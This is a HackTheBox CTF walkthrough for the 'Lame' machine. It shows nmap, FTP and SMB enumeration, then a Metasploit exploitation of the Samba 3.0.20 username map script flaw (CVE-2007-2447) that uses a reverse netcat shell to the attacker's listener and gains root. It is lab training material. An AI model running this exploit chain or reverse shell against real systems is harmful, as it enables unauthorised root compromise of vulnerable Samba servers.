---
title: HackTheBox Lame Writeup
description: A simple linux machine, Samba Username map script RCE.
author: 
date: 2025-04-03
categories: [CTF, HTB]
tags: [HTB, CTF]
pin: true
math: true
mermaid: true
image:
  path: /assets/img/feature.png
  alt: Responsive rendering of Chirpy theme on multiple devices.
---
# Enumeration
#### Port and Service enumeration

```shell
$ nmap -sC -sV 10.10.10.3

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.82
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h41m54s, deviation: 2h49m45s, median: -18m07s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-04-03T09:03:20-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
```

From the scan result we can see that 5 TCP port are open.
  - 21/tcp  ---> ftp  ---> vsftpd 2.3.4
  - 22/tcp  ---> ssh  ---> OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
  - 139/tcp  ---> netbios-ssn  ---> Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  - 445/tcp  ---> netbios-ssn  ---> Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
  - 3632/tcp  ---> distccd  ---> distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

Now more enumerate these services for exploitation.

##### 21/tcp ftp
- At first try to login Anonymously using username `anonymous` and blank password.

```bash
$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
```

- Login successful. But this is empty

```bash
ftp> ls -la
229 Entering Extended Passive Mode (|||22196|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
```

##### 22/tcp ssh
- Its rare to find any ssh exploit. So I'll skip this.

##### 139/tcp 445/tcp netbios-ssn
- List all available shares using `smbclient`

```bash
$ smbclient -L 10.10.10.3 
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
```

- Here we find two non default share `tmp` and `opt`. Let's inspect them more.

```bash
$ smbclient \\\\10.10.10.3\\tmp
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_IO_TIMEOUT listing \*
smb: \> 
smb: \> dir
NT_STATUS_IO_TIMEOUT listing \*
smb: \> ^C
```
- This shows timeout. So I cancled it. Now inspect opt

```bash
$ smbclient \\\\10.10.10.3\\opt
Password for [WORKGROUP\kali]:
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```
- This gives Access Denied. Now move forward.

# Exploitation
- From enumeration we found samba 3.0.20 version, which is vulnerable to **CVE-2007-2447** 'Username map script' RCE .
- This exploit has a metasploit module. Now start metasploit framework using `msfconsole` and search for the exploit.

```
msf6 > search samba 3.0.20
Matching Modules
================
   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution

Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
msf6 > 
```

- Here we found out exploit with number 0 and this exploit Rank is `excellent`. Now configure and use this exploit.

```
msf6 > use 0
```
- Show all available options of this exploit

```
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usin
                                       g-metasploit.html
   RPORT    139              yes       The target port (TCP)

Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.40.170   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.
```

- Now set remote host

```
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
```

- Set localhost where we will receive the reverse shell. It should be your tun/VPN ip 

```
msf6 exploit(multi/samba/usermap_script) > set LHOST <your-ip>
LHOST => 10.10.14.82
```

- Finally run the exploit using `run` or `exploit`

```
msf6 exploit(multi/samba/usermap_script) > run
[*] Started reverse TCP handler on 10.10.14.82:4444 
[*] Command shell session 1 opened (10.10.14.82:4444 -> 10.10.10.3:37039) at 2025-04-03 19:48:11 +0600
```

- After exploittation it will not show a prompt. To show a prompt just execute `sh`.

```
sh-3.2# whoami
whoami
root
sh-3.2# id
id
uid=0(root) gid=0(root)
sh-3.2# hostname
hostname
lame
sh-3.2# 
```

**As we got a root shell, so we do not need to privilege escation**